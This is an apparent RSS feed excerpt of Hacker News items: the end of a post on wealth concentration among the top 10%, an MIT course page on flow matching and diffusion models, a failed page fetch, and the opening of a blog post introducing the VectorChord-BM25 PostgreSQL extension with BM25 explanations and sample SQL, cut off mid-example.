<p>These numbers have all increased since 1989 as well — total wealth (60.8% to 67.3%), stocks (81.7% to 87.2%), private businesses (78.4% to 84.4%) and real estate (38.2% to 43.9%).</p>
<p>According to <a href="https://www.wsj.com/economy/consumers/us-economy-strength-rich-spending-2c34a571" target="_blank" rel="noopener">The Wall Street Journal</a>, the top 10% also accounts for 50% of all consumer spending:</p>
<img decoding="async" src="https://awealthofcommonsense.com/wp-content/uploads/2025/02/Screenshot-2025-02-24-100449.png" alt="" width="381" height="585" srcset="https://awealthofcommonsense.com/wp-content/uploads/2025/02/Screenshot-2025-02-24-100449.png 452w, https://awealthofcommonsense.com/wp-content/uploads/2025/02/Screenshot-2025-02-24-100449-195x300.png 195w" sizes="(max-width: 381px) 100vw, 381px">
<p>Three decades ago the top 10% made up 36% of spending.</p>
<p>It’s accelerating this decade:</p>
<p><em>Between September 2023 and September 2024, the high earners increased their spending by 12%. Spending by working-class and middle-class households, meanwhile,&nbsp;dropped&nbsp;over the same period.&nbsp;</em></p>
<p><em>The bottom 80% of earners spent 25% more than they did four years earlier, barely outpacing price increases of 21% over that period. The top 10% spent 58% more.</em></p>
<p>The top 10% is spending way more on an inflation-adjusted basis in the 2020s.</p>
<p>Look at the travel budget for the wealthiest household (via another piece from the <a href="https://www.wsj.com/business/disney-parks-price-hikes-consumers-0bf4dbd6" target="_blank" rel="noopener">WSJ</a>):</p>
<img decoding="async" src="https://awealthofcommonsense.com/wp-content/uploads/2025/02/Screenshot-2025-02-10-121600.png" alt="" width="606" height="609" srcset="https://awealthofcommonsense.com/wp-content/uploads/2025/02/Screenshot-2025-02-10-121600.png 606w, https://awealthofcommonsense.com/wp-content/uploads/2025/02/Screenshot-2025-02-10-121600-300x300.png 300w, https://awealthofcommonsense.com/wp-content/uploads/2025/02/Screenshot-2025-02-10-121600-150x150.png 150w, https://awealthofcommonsense.com/wp-content/uploads/2025/02/Screenshot-2025-02-10-121600-125x125.png 125w" sizes="(max-width: 606px) 100vw, 606px">
<p>The wealthy class exist in a different stratosphere and there are wide-ranging implications here:</p>
<p><strong>Concentration is everywhere.&nbsp;</strong>The stock market is concentrated. So is the economy. This concentration could make markets and the economy riskier but it also makes them harder to handicap.</p>
<p>When you have wealth concentrated in the hands of the few it’s much more difficult to understand what’s going on using metrics that may have worked in the past.</p>
<p>This is why economic anecdotes aren’t very useful when trying to gauge the performance of the U.S. economy.</p>
<p><strong>What happens if the wealth effect slows?&nbsp;</strong>The top 10% is spending more in part because their financial assets have increased in value substantially. Stocks are up. Housing prices are up. Equity in businesses is up.</p>
<p>The stock market is not the economy, but it seems like the two are now more intertwined than they were in the past.</p>
<p><strong>I’m not sure what stops this. </strong>Wealth inequality is only getting worse in this country and frankly I’m not sure what stops this train. It feels like it’s unsustainable but the rich just keep getting richer.</p>
<p>Short of a financial crisis I don’t really see what slows this trend. Even then I’m not sure there would be much of a long-term impact. If there is a financial crisis, guess who has the means to ride out a storm and buy assets on the cheap? The top 10%.</p>
<p>Unfortunately, I don’t see wealth inequality getting better any time soon.</p>
<p>I’m fairly confident it’s only going to get worse from here.</p>
<p>Further Reading:<br>
<a href="https://awealthofcommonsense.com/2024/06/the-bottom-50/" target="_blank" rel="noopener">The Bottom 50%</a></p>
									</section> <!-- end article section -->

									 <!-- end article footer -->

									<div>
											<h2>Now go talk about it.</h2>
											  
  										</div>

									
									
									
									
								</article> <!-- end article -->

							
							
						</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[MIT 6.S184: Introduction to Flow Matching and Diffusion Models (311 pts)]]></title>
            <link>https://diffusion.csail.mit.edu</link>
            <guid>43238893</guid>
            <pubDate>Mon, 03 Mar 2025 06:27:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://diffusion.csail.mit.edu">https://diffusion.csail.mit.edu</a>, See on <a href="https://news.ycombinator.com/item?id=43238893">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content">
    <h2>Introduction to Flow Matching and Diffusion Models</h2>
    <h2>MIT Computer Science Class 6.S184: Generative AI with Stochastic Differential Equations</h2>
<p>
Diffusion and flow-based models have become the state of the art for generative AI across a wide range of data modalities, including images, videos, shapes, molecules, music, and more! This course aims to build up the mathematical framework underlying these models from first principles. At the end of the class, students will have built a toy image diffusion model from scratch, and along the way, will have gained hands-on experience with the mathematical toolbox of stochastic differential equations that is useful in many other fields. This course is ideal for students who want to develop a principled understanding of the theory and practice of generative AI.
</p><h2 id="notes">Course Notes</h2>
  <p>
  The course notes serve as the backbone of the course and provide a self-contained explanation of all material in the class. In contrast, lectures slides will generally not be self-contained and are intended to provide accompanying visualizations during the lecture. You may view the notes by clicking on the colored link below.
  </p>
  

<h2 id="lectures">Lectures</h2>
<table>
  <tbody><tr>
    <th>Lecture</th>
    <th>Topic</th>
    <th>Slides</th>
    <th>Recording</th>
  </tr>
  
  <tr>
    <td>1</td>
    <td>
      <span>Flow and Diffusion Models</span>
      <ul>
        <li>Introduction to generative models</li>
        <li>Ordinary and stochastic differential equations</li>
        <li>Sampling from flow and diffusion models</li>
      </ul>
    </td>
    <td><a href="https://diffusion.csail.mit.edu/docs/slides_lecture_1.pdf" target="_blank">[slides 1]</a></td>
    <td>
      <iframe src="https://www.youtube.com/embed/GCoP2w-Cqtg?si=SY3y8IRN_kCFjDt0" frameborder="0" allowfullscreen=""></iframe>
      <br>
      <!-- <a href="https://www.youtube.com/watch?v=bBA0Ueb80hg" target="_blank" class="watch-youtube">▶ Watch on YouTube</a> -->
    </td>
  </tr>

  <tr>
    <td>2</td>
    <td>
      <span>Constructing a Training Target</span>
      <ul>
        <li>Conditional and marginal probability paths</li>
        <li>Continuity and Fokker-Planck equations</li>
        <li>Marginal vector field and marginal score function</li>
      </ul>
    </td>
    <td><a href="https://diffusion.csail.mit.edu/docs/slides_lecture_2.pdf" target="_blank">[slides 2]</a></td>
    <td>
      <iframe src="https://www.youtube.com/embed/yFD-JSSG-D0?si=75ROyI54iBZ7WnAO" frameborder="0" allowfullscreen=""></iframe>
      <br>
      <!-- <a href="https://www.youtube.com/watch?v=VIDEO_ID_2" target="_blank" class="watch-youtube">▶ Watch on YouTube</a> -->
    </td>
  </tr>

  <tr>
    <td>3</td>
    <td>
      <span>Training Flow and Diffusion Models</span>
      <ul>
        <li>Flow matching</li>
        <li>Score matching</li>
        <li>Various approaches to diffusion models</li>
      </ul>
    </td>
    <td><a href="https://diffusion.csail.mit.edu/docs/slides_lecture_3.pdf" target="_blank">[slides 3]</a></td>
    <td>
      <iframe src="https://www.youtube.com/embed/HhfLo1_yza4?si=Xf09xmI6fG_4ibKo" frameborder="0" allowfullscreen=""></iframe>
      <br>
      <!-- <a href="https://www.youtube.com/watch?v=VIDEO_ID_3" target="_blank" class="watch-youtube">▶ Watch on YouTube</a> -->
    </td>
  </tr>
  <tr>
    <td>4</td>
    <td>
      <span>Building an Image Generator</span>
      <ul>
        <li>Guidance and conditional generation</li>
        <li>Neural network architectures</li>
        <li>Survey of state-of-the-art models</li>
      </ul>
    </td>
    <td><a href="https://diffusion.csail.mit.edu/docs/slides_lecture_4.pdf" target="_blank"> [slides 4] </a></td>
    <td>
      <iframe src="https://www.youtube.com/embed/nfrZ30mnwP0?si=80pQcYMj6Ml85pjJ" frameborder="0" allowfullscreen=""></iframe>
      <br>
      <!-- <a href="https://www.youtube.com/watch?v=VIDEO_ID_3" target="_blank" class="watch-youtube">▶ Watch on YouTube</a> -->
    </td>
  </tr>
  <tr>
    <td>5</td>
    <td>
      <span>Generative Robotics</span>
      <ul>
        <li>Guest lecture by Benjamin Burchfiel (Toyota Research)</li>
        <li>Large behavior models</li>
        <li>Diffusion models for robotics</li>
      </ul>
    </td>
    <td><a href="" target="_blank"> N/A</a></td>
    <td>
      <iframe src="https://www.youtube.com/embed/7tsCN2hRBMg?si=r2KwAAJWnsPlWN47" frameborder="0" allowfullscreen=""></iframe>
      <br>
      <!-- <a href="https://www.youtube.com/watch?v=VIDEO_ID_3" target="_blank" class="watch-youtube">▶ Watch on YouTube</a> -->
    </td>
  </tr>
  <tr>
    <td>6</td>
    <td>
      <span>Generative Protein Design</span>
      <ul>
        <li>Guest lecture by Jason Yim (MIT)</li>
        <li>Designing new proteins with AI</li>
        <li>Flow matching for protein structure generation</li>
      </ul>
    </td>
    <td><a href="https://diffusion.csail.mit.edu/docs/slides_lecture_6.pdf" target="_blank"> [slides 6]</a></td>
    <td>
      <iframe src="https://www.youtube.com/embed/hi_s4T1-gBY?si=WEJX9Vv4ThmwaAaY" frameborder="0" allowfullscreen=""></iframe>
      <br>
      <!-- <a href="https://www.youtube.com/watch?v=VIDEO_ID_3" target="_blank" class="watch-youtube">▶ Watch on YouTube</a> -->
    </td>
  </tr>
</tbody></table>

<!-- <table class="schedule-table">
  <tr>
    <th>Lecture</th>
    <th>Topic</th>
    <th>Slides</th>
    <th>Recording</th>
  </tr>
  <tr>
    <td>Lecture 1</td>
    <td>Flow and Diffusion Models</td>
    <td><a href="docs/slides_lecture_1.pdf" target="_blank">[Slides]</a></td>
    <td>
      <div style="position: relative; display: inline-block;">
        <iframe width="280" height="157" src="https://www.youtube.com/embed/bBA0Ueb80hg?si=dqakGUwXyPAa5RsL" 
            title="YouTube video player" frameborder="0" 
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
            referrerpolicy="strict-origin-when-cross-origin" allowfullscreen>
        </iframe>
        
        <a href="https://www.youtube.com/watch?v=bBA0Ueb80hg" target="_blank" 
           style="position: absolute; bottom: 5px; right: 5px; background: rgba(0,0,0,0.7); 
                  color: white; padding: 4px 8px; text-decoration: none; border-radius: 3px; font-size: 12px;">
            Watch on YouTube
        </a>
    </div>
  </td>
  </tr>
  <tr>
    <td>Lecture 2</td>
    <td>Constructing a Training Target</td>
    <td><a href="docs/slides_lecture_1.pdf" target="_blank">[Slides]</a></td>
    <td>
      <div style="position: relative; display: inline-block;">
        <iframe width="280" height="157" src="https://www.youtube.com/embed/bBA0Ueb80hg?si=dqakGUwXyPAa5RsL" 
            title="YouTube video player" frameborder="0" 
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
            referrerpolicy="strict-origin-when-cross-origin" allowfullscreen>
        </iframe>
        
        <a href="https://www.youtube.com/watch?v=bBA0Ueb80hg" target="_blank" 
           style="position: absolute; bottom: 5px; right: 5px; background: rgba(0,0,0,0.7); 
                  color: white; padding: 4px 8px; text-decoration: none; border-radius: 3px; font-size: 12px;">
            Watch on YouTube
        </a>
    </div>
  </td>
  </tr>
  <tr>
    <td>Lecture 3</td>
    <td>Flow Matching and Score Matching</td>
    <td><a href="docs/slides_lecture_1.pdf" target="_blank">[Slides]</a></td>
    <td>
      <div style="position: relative; display: inline-block;">
        <iframe width="280" height="157" src="https://www.youtube.com/embed/bBA0Ueb80hg?si=dqakGUwXyPAa5RsL" 
            title="YouTube video player" frameborder="0" 
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
            referrerpolicy="strict-origin-when-cross-origin" allowfullscreen>
        </iframe>
        
        <a href="https://www.youtube.com/watch?v=bBA0Ueb80hg" target="_blank" 
           style="position: absolute; bottom: 5px; right: 5px; background: rgba(0,0,0,0.7); 
                  color: white; padding: 4px 8px; text-decoration: none; border-radius: 3px; font-size: 12px;">
            Watch on YouTube
        </a>
    </div>
  </td>
  </tr>
</table> -->
<!-- <strong>Lectures</strong>: Lectures will be held from 11:00am - 12:30pm, in Room <a href="https://whereis.mit.edu/?go=E25"> E25-111</a>. Notes, slides, and video recordings will be linked below once available. Registered students may also view recordings on Canvas via Panopto.<br />
<ul>
    <li>
    <strong>Tuesday, 1/21/2025</strong>: Flow and Diffusion Models <a href="docs/lecture-notes.pdf" style="color: rgb(255, 196, 0);">[notes]</a><a href="docs/slides_lecture_1.pdf" target="_blank" style="color: rgb(255, 196, 0);">[slides]</a> <a href="https://mit.hosted.panopto.com/Panopto/Pages/Sessions/List.aspx?folderID=33a0af0b-dd76-4213-b033-b26700e17e3f" style="color: rgb(255, 196, 0);">[recording</a>]
    </li>
    <li>
        <strong>Wed, 1/22/2025</strong>: The Marginal Vector Field and Score <a href="docs/lecture-notes.pdf" style="color: rgb(255, 196, 0);">[notes]</a><a href="docs/slides_lecture_2.pdf" target="_blank" style="color: rgb(255, 196, 0);">[slides]</a> <a href="https://mit.hosted.panopto.com/Panopto/Pages/Sessions/List.aspx?folderID=33a0af0b-dd76-4213-b033-b26700e17e3f" style="color: rgb(255, 196, 0);">[recording</a>]
    </li>
    <li>
        <strong>Thu, 1/23/2025</strong>: Flow Matching and Score Matching <a href="docs/lecture-notes.pdf" style="color: rgb(255, 196, 0);">[notes]</a><a href="docs/slides_lecture_3.pdf" target="_blank" style="color: rgb(255, 196, 0);">[slides]</a> <a href="https://mit.hosted.panopto.com/Panopto/Pages/Sessions/List.aspx?folderID=33a0af0b-dd76-4213-b033-b26700e17e3f" style="color: rgb(255, 196, 0);">[recording</a>]
    </li>
    <li>
        <strong>Monday, 1/27/2025</strong>: Conditional Image Generation<a href="docs/lecture-notes.pdf" style="color: rgb(255, 196, 0);">[notes]<a><a href="docs/slides_lecture_4.pdf" target="_blank" style="color: rgb(255, 196, 0);">[slides]</a> <a href="https://mit.hosted.panopto.com/Panopto/Pages/Viewer.aspx?id=39574796-6c7a-4691-8e9a-b26700e2c8f2" style="color: rgb(255, 196, 0);">[recording</a>]
        <ul>
          <li> Classifier-Free Guidance
          <li> Neural Network Architectures
          <li> Alignment: Carles Domingo-Enrich (Microsoft Research) <a href="docs/guest_slides_lecture_4.pdf" target="_blank" style="color: rgb(255, 196, 0);">[slides]</a>
          </li>
      </ul>
    </li>
    <li>
        <strong>Thursday, 1/30/2025</strong>: Guest lecture: Diffusion models across applications.
        <ul>
            <li> Robotics: Benjamin Burchfiel (Toyota Research Institute) <a href="https://mit.hosted.panopto.com/Panopto/Pages/Viewer.aspx?id=39574796-6c7a-4691-8e9a-b26700e2c8f2" style="color: rgb(255, 196, 0);">[recording</a>] </li> 
            <li> Protein design: Jason Yim (MIT) <a href="docs/slides_lecture_5_jason.pdf" target="_blank" style="color: rgb(255, 196, 0);">[slides]</a> <a href="https://mit.hosted.panopto.com/Panopto/Pages/Viewer.aspx?id=39574796-6c7a-4691-8e9a-b26700e2c8f2" style="color: rgb(255, 196, 0);">[recording</a>] </li>
        </ul>
    </li>
</ul> -->

<!-- <strong>Office hours</strong>: Office hours will be held at the following dates and times:
<ul>
    <li>
    <strong>Week One</strong>: 
    <ul>
    <li>  1/22/2025 @ 3:00pm-4:30pm (Room <a href="https://whereis.mit.edu/?go=37">37-212 </a>)
    <li>  1/24/2025 @ 11:00am-12:30pm (Room <a href="https://whereis.mit.edu/?go=37">37-212 </a>)
    </ul>
    </li>
    <li>
    <strong>Week Two</strong>: 
    <ul>
      <li> 1/28/2025 @ 11:00am-12:30pm (Room <a href="https://whereis.mit.edu/?go=E25">E25-111 </a>)
      <li> 1/29/2025 @ 11:00am-12:30pm (Room <a href="https://whereis.mit.edu/?go=37">37-212 </a>)
      <li> 1/31/2025 @ 11:00am-12:30pm (Room <a href="https://whereis.mit.edu/?go=37">37-212 </a>)
      </ul>
    </li>
</ul> -->



<h2 id="labs">Labs</h2><p>

There are 3 <b>labs</b> given as exercises accompanying the class to give you <b>hands-on practical experience</b>. The labs will guide you through building a flow matching and diffusion model from scratch step-by-step. To do the exercises, perform the following steps:
</p><ol>
  <li>Click on the <b>"Open in Colab"</b> link to open the lab in Google Drive.</li>
  <li>Click on the <b>"Open in Google Colaboratory"</b> link at the center top of the page. A jupyter notebook should appear.</li>
  <li>Click on <b>"File" → "Save a copy in Drive"</b> to save a copy of the lab to your own Google Drive.</li>
  <li>Follow the instructions in the lab to complete the exercises.</li>
</ol>




<p>
  <strong>Stuck?</strong> Solutions can be found 
  <a href="https://github.com/eje24/iap-diffusion-labs">here</a>.
</p>

<!-- <h1 id="labs">Labs</h1>

There will be 3 <b>labs</b> given as homework which culminate in a conditional flow matching model. The labs will guide you through building this model from scratch step-by-step.

<ul>
  <li>
    <strong> Lab 1</strong>:
    Working with SDEs [<a href="https://drive.google.com/file/d/1kT_epFEuPD_uAHzKVWufovMf5Ro0lER1/view?usp=sharing"style="color: rgb(255, 196, 0);">Colab</a>]
  </li>
  <li>
    <strong> Lab 2</strong>:
    Flow Matching and Score Matching [<a href="https://drive.google.com/file/d/1Su2zbsubk0GB7obELDLpD7vHmE2huW-_/view?usp=sharing"style="color: rgb(255, 196, 0);">Colab</a>]

  </li>
  <li>
    <strong> Lab 3</strong>:
    Conditional Image Generation [<a href="https://drive.google.com/file/d/1crSvL3ongtw0H0qO1DhnfQHW-biTasGb/view?usp=sharing"style="color: rgb(255, 196, 0);">Colab</a>]

  </li>
</ul>
Stuck? Solutions can be found <a href="https://github.com/eje24/iap-diffusion-labs">here</a>. -->

<!-- <h1 id="schedule">Grading<a id="schedule"></a></h1> -->
<!---->
<!-- Grading will be P/D/F, 18 points and above required to receive credit. The total points are calculated as follows: -->
<!-- <ul> -->
<!-- <li> Participation/attendance (10 points)  -->
<!-- </li> -->
<!-- <li>  -->
<!--     Labs (15 points, 5 points each) -->
<!-- </li> -->
<!-- </ul> -->


<h2 id="instructors">Instructors<a id="instructors"></a></h2>
<p>This class was co-taught by <a href="https://www.peterholderrieth.com/">Peter</a> and <a href="https://eerives.me/">Ezra</a>. We are fortunate to have <a href="https://people.csail.mit.edu/tommi/">Tommi Jaakkola</a> as our sponsor and advisor.<br></p>


 
<p><strong>Prerequisites:</strong> Linear algebra, real analysis, and basic probability theory. Students should be familiar with Python and have some experience with PyTorch.

</p><p><strong>Questions?</strong> Email either <a href="mailto:phold@mit.edu">Peter</a> or <a href="mailto:erives@mit.edu">Ezra</a>!</p>

<p><strong>Remark about LLMs:</strong> This course does not cover large language models (LLMs). LLMs involve discrete data such as text, while this course focuses on data lying in continuous spaces such as images, videos, and protein structures. 

</p><h2 id="acknowledgements">Acknowledgements</h2><p>
We would like to thank the following individuals and organizations without whose support this course would not be possible:
</p><ul>
	<li>Professor <a href="https://people.csail.mit.edu/tommi/">Tommi Jaakkola</a>  without whose support this class would not be possible</li>
	<li>Lisa Bella, Ellen Reid, and everyone else at <a href="https://www.eecs.mit.edu/">MIT EECS</a> for their generous support</li>
	<li>Christian Fiedler, Tim Griesbach, Benedikt Geiger, and Albrecht Holderrieth for invaluable feedback on the lecture notes</li>
	<li>Elaine Mello from MIT Open Learning for support with lecture recordings</li>
	<li>Ashay Athalye from Students for Open and Universal Learning for helping to edit and publish lecture recordings</li>
	<li>Cameron Diao, Tally Portnoi, Andi Qu, and many others for providing invaluable feedback on the labs</li>
	<li><a href="https://github.com/missing-semester/missing-semester">The Missing Semester of Your CS Education</a> upon whose website this one was inspired</li>
	<li>Participants in the original course offering (MIT 6.S184/6.S975, taught over IAP 2025), as well as readers like you for your interest in this course</li>
</ul><p>
Thank you!
</p><hr>




    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Linux laptop maker called me a Zombie (122 pts)]]></title>
            <link>https://thelibre.news/this-linux-laptop-maker-called-me-a-zombie/</link>
            <guid>43237987</guid>
            <pubDate>Mon, 03 Mar 2025 03:25:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://thelibre.news/this-linux-laptop-maker-called-me-a-zombie/">https://thelibre.news/this-linux-laptop-maker-called-me-a-zombie/</a>, See on <a href="https://news.ycombinator.com/item?id=43237987">Hacker News</a></p>
Couldn't get https://thelibre.news/this-linux-laptop-maker-called-me-a-zombie/: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[BM25 in PostgreSQL (136 pts)]]></title>
            <link>https://blog.vectorchord.ai/vectorchord-bm25-revolutionize-postgresql-search-with-bm25-ranking-3x-faster-than-elasticsearch</link>
            <guid>43237911</guid>
            <pubDate>Mon, 03 Mar 2025 03:10:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.vectorchord.ai/vectorchord-bm25-revolutionize-postgresql-search-with-bm25-ranking-3x-faster-than-elasticsearch">https://blog.vectorchord.ai/vectorchord-bm25-revolutionize-postgresql-search-with-bm25-ranking-3x-faster-than-elasticsearch</a>, See on <a href="https://news.ycombinator.com/item?id=43237911">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post-content-parent"><p>We’re excited to share something special with you: <strong>VectorChord-BM25</strong>, a new extension designed to make PostgreSQL’s full-text search even better. Whether you’re building a small app or managing a large-scale system, this tool brings advanced BM25 scoring and ranking right into PostgreSQL, making your searches smarter and faster.</p>
<h3 id="heading-whats-new"><strong>What’s New?</strong></h3>
<ul>
<li><p><strong>BM25 Scoring &amp; Ranking</strong>: Get more precise and relevant search results with BM25, helping you find what matters most.</p>
</li>
<li><p><strong>Optimized Indexing</strong>: Thanks to the Block WeakAnd algorithm, searches are quicker and more efficient, even with large datasets.</p>
</li>
<li><p><strong>Enhanced Tokenization</strong>: Improved stemming and stop word handling mean better accuracy and smoother performance.</p>
</li>
</ul>
<p>We built VectorChord-BM25 to be simple, powerful, and fully integrated with PostgreSQL—because we believe great tools should make your life easier, not more complicated. We hope you’ll give it a try and let us know what you think.</p>



<p>Before we get to the exciting news, let’s take a quick look at <strong>BM25</strong>, the algorithm that powers modern search engines. BM25 is a probabilistic ranking function that determines how relevant a document is to a search query.</p>
<p>The BM25 formula might look a bit intimidating at first, but let’s break it down step by step to make it easy to understand. Here’s it:</p>
<p>$$\text{score}(Q, D) = \sum_{q \in Q} \text{IDF}(q) \cdot \frac{f(q, D) \, (k_1 + 1)}{f(q, D) + k_1 \cdot \left(1 - b + b \cdot \frac{|D|}{\text{avgdl}}\right)}$$</p><p><strong>Term Frequency (TF)</strong>: The term f(q,D) represents how often the query term <em>q</em> appears in document <em>D</em>. The more a term appears in a document, the higher its relevance score. For example, if "AI" appears 5 times in Document A and 2 times in Document B, Document A gets a higher score for this term.</p>
<p><strong>Inverse Document Frequency (IDF)</strong>: The term IDF(q) measures how rare or common the term <em>q</em> is across all documents. Rare terms (e.g., "NVIDIA") are given more weight than common terms (e.g., "revenue"). This ensures that unique terms have a greater impact on the relevance score.</p>
<p><strong>Document Length Normalization</strong>: The term ∣<em>D</em>∣ represents the length of document <em>D</em>, while avgdl is the average length of all documents in the collection. This part of the formula adjusts the score to account for document length, ensuring shorter documents aren’t unfairly penalized. For instance, a concise report won’t be overshadowed by a lengthy one that only briefly mentions the query term.</p>
<p><strong>Tuning Parameters</strong>: The parameters <em>k</em>1 and <em>b</em> allow the formula to be fine-tuned. <em>k</em>1 controls the extent to which term frequency impacts the score, while <em>b</em> balances the effect of document length normalization. These parameters can be adjusted to optimize results for specific datasets.</p>
<p>Consider searching a database of financial reports for "Tesla stock performance." A report that mentions "Tesla" ten times will score higher than one that mentions it only twice. However, the term "stock" might appear in many reports, so it’s given less weight than "Tesla," which is more specific. Furthermore, a short, concise report about Tesla’s stock performance won’t be overshadowed by a lengthy report that only briefly mentions Tesla.</p>
<h2 id="heading-existing-solution-in-postgres">Existing Solution in Postgres</h2>
<p>Now that we’ve covered the basics, let’s take a look at the existing solutions for full-text search in PostgreSQL.</p>
<p>PostgreSQL provides built-in support for full-text search through the combination of the <code>tsvector</code> data type and GIN (Generalized Inverted Index) indexes. Here’s how it works: text is first converted into a <code>tsvector</code>, which tokenizes the content into lexemes—standardized word forms that make searching more efficient. A GIN index is then created on the <code>tsvector</code> column, significantly speeding up query performance and enabling fast retrieval of relevant documents, even when dealing with large text fields. This integration of text processing and advanced indexing makes PostgreSQL a powerful and scalable solution for applications that require efficient full-text search.</p>
<pre><code><span>-- Create a table with a text column</span>
<span>CREATE</span> <span>TABLE</span> documents (
    <span>id</span> <span>SERIAL</span> PRIMARY <span>KEY</span>,
    <span>content</span> <span>TEXT</span>,
    content_vector tsvector
);

<span>-- Insert sample data with tsvector conversion</span>
<span>INSERT</span> <span>INTO</span> documents (<span>content</span>, content_vector) <span>VALUES</span>
(<span>'PostgreSQL is a powerful, open-source database system.'</span>, to_tsvector(...)),
(<span>'Full-text search in PostgreSQL is efficient and scalable.'</span>, to_tsvector(...)),
(<span>'BM25 is a ranking function used by search engines.'</span>, to_tsvector(...));

<span>-- Create a GIN index on the tsvector column</span>
<span>CREATE</span> <span>INDEX</span> idx_content_vector <span>ON</span> documents <span>USING</span> GIN (content_vector);

<span>-- Query using tsvector, rank results with ts_rank, and leverage the GIN index</span>
<span>SELECT</span> <span>id</span>, <span>content</span>, ts_rank(content_vector, to_tsquery(<span>'english'</span>, <span>'PostgreSQL &amp; search'</span>)) <span>AS</span> <span>rank</span>
<span>FROM</span> documents
<span>WHERE</span> content_vector @@ to_tsquery(<span>'english'</span>, <span>'PostgreSQL &amp; search'</span>)
<span>ORDER</span> <span>BY</span> <span>rank</span> <span>DESC</span>;
</code></pre>
<p>However, PostgreSQL has a limitation: it lacks modern relevance scoring mechanisms like BM25. Instead, it returns all matching documents and relies on <code>ts_rank</code> to re-rank them, which can be inefficient. This makes it challenging for users to quickly identify the most important results, especially when dealing with large datasets.</p>
<p>Another solution is ParadeDB, which pushes full-text search queries down to Tantivy for results. It supports BM25 scoring and complex query patterns like negative terms, aiming to be a complete replacement for ElasticSearch. However, it uses its own unique syntax for filtering and querying and delegates filtering operations to Tantivy instead of relying on Postgres directly. Its implementation requires several hooks into Postgres' query planning and storage, potentially leading to compatibility issues.</p>
<p>In contrast, VectorChord-BM25 takes a different approach. It focuses exclusively on bringing BM25 ranking to PostgreSQL in a lightweight and native way. We implemented the BM25 ranking algorithm and the Block WeakAnd technique from scratch, building it as a custom operator and index (similar to <code>pgvector</code>) to accelerate queries. Designed to be intuitive and efficient, VectorChord-BM25 <strong>provides a seamless API for enhanced full-text search and ranking, all while staying fully integrated with PostgreSQL’s ecosystem</strong>.</p>
<h2 id="heading-vectorchord-bm25">VectorChord-BM25</h2>
<p>Our implementation introduces a novel approach by developing the BM25 index and search algorithm from the ground up, while seamlessly integrating with PostgreSQL’s existing development interfaces to ensure maximum compatibility.</p>
<p>Inspired by the PISA engine, Tantivy, and Lucene, we incorporated the BlockMax WeakAnd algorithm to facilitate efficient score-based filtering and ranking. Furthermore, we employ bitpacking for ID compression to enhance overall efficiency and re-implemented a user data-based tokenizer to more closely align with ElasticSearch’s performance.</p>
<p>The table below compares the <strong>Top1000 Queries Per Second (QPS)</strong>—a metric that measures how many queries a system can process per second while retrieving the top 1000 results for each query—between our implementation and ElasticSearch across various datasets from <a target="_blank" href="https://github.com/xhluca/bm25-benchmarks">bm25-benchmarks</a>:</p>
<p><img data-zoomable="true" loading="lazy" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1740189817247/5a81c020-1aa2-452d-8e8d-b9653c5b3489.png?auto=compress,format&amp;format=webp" alt=""></p>
<p>On average, our implementation achieves <strong>3 times higher QPS</strong> compared to ElasticSearch across the tested datasets, showcasing its efficiency and scalability. However, speed alone isn’t sufficient—we also prioritize accuracy. To ensure relevance, we evaluated <strong>NDCG@10 (Normalized Discounted Cumulative Gain at 10)</strong>, a key metric for assessing ranking quality.</p>
<div data-node-type="callout">
<p>💡</p>
<p><strong>NDCG@10</strong> (Normalized Discounted Cumulative Gain at rank 10) is a metric that assesses the relevance of documents within the top 10 positions of a ranked list. It emphasizes not only the relevance of each document but also its position, ensuring higher-ranked relevant documents contribute more to the overall score.</p>
</div>

<p>The table below compares the NDCG@10 scores between VectorChord-BM25 and ElasticSearch across various datasets:</p>
<p><img data-zoomable="true" loading="lazy" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1740190423528/10f75122-34fc-4fa2-bb66-3e26e09516ec.png?auto=compress,format&amp;format=webp" alt=""></p>
<p>We have dedicated substantial effort to align VectorChord-BM25 with ElasticSearch’s behavior, ensuring a fair and precise comparison. As demonstrated in the table, our implementation achieves NDCG@10 scores that are comparable across most datasets, with certain cases even surpassing ElasticSearch (e.g., trec-covid and scifact).</p>
<p>We’ll share the technical details of our alignment efforts in a later section, including how we addressed tokenization, scoring, and other critical components to achieve these results. Before that, let’s explore how to use VectorChord-BM25 in PostgreSQL.</p>
<h2 id="heading-quick-start">Quick start</h2>
<p>To get started with VectorChord-BM25, we’ve put together a detailed guide in our <a target="_blank" href="https://github.com/tensorchord/VectorChord-bm25/">GitHub README</a> that walks you through the installation and configuration process. Below, you’ll find a complete example showing how to use VectorChord-BM25 for BM25 full-text search in Postgres. Each SQL snippet comes with a clear explanation of what it does and why it’s useful.</p>
<p>The extension consists of three main components:</p>
<ul>
<li><p><strong>Tokenizer</strong>: Converts text into a bm25vector, which is similar to a sparse vector that stores vocabulary IDs and their frequencies.</p>
</li>
<li><p><strong>bm25vector</strong>: Represents the tokenized text in a format suitable for BM25 scoring.</p>
</li>
<li><p><strong>bm25vector Index</strong>: Speeds up the search and ranking process, making it more efficient.</p>
</li>
</ul>
<p>If you’d like to tokenize some text, you can use the <code>tokenize</code> function. It takes two arguments: the text you want to tokenize and the name of the tokenizer.</p>
<pre><code><span>-- tokenize text with bert tokenizer</span>
<span>SELECT</span> tokenize(<span>'A quick brown fox jumps over the lazy dog.'</span>, <span>'Bert'</span>);
<span>-- Output: {2474:1, 2829:1, 3899:1, 4248:1, 4419:1, 5376:1, 5831:1}</span>
<span>-- The output is a bm25vector, 2474:1 means the word with id 2474 appears once in the text.</span>
</code></pre>
<p>One unique aspect of the BM25 score is that it relies on a global document frequency. This means the score of a word in a document is influenced by how frequently that word appears across all documents in the set. To calculate the BM25 score between a bm25vector and a query, you’ll first need a document set. Once that’s in place, you can use the <code>&lt;&amp;&gt;</code> operator to perform the calculation.</p>
<p>Here is an example step by step. First, create a table and insert some documents:</p>
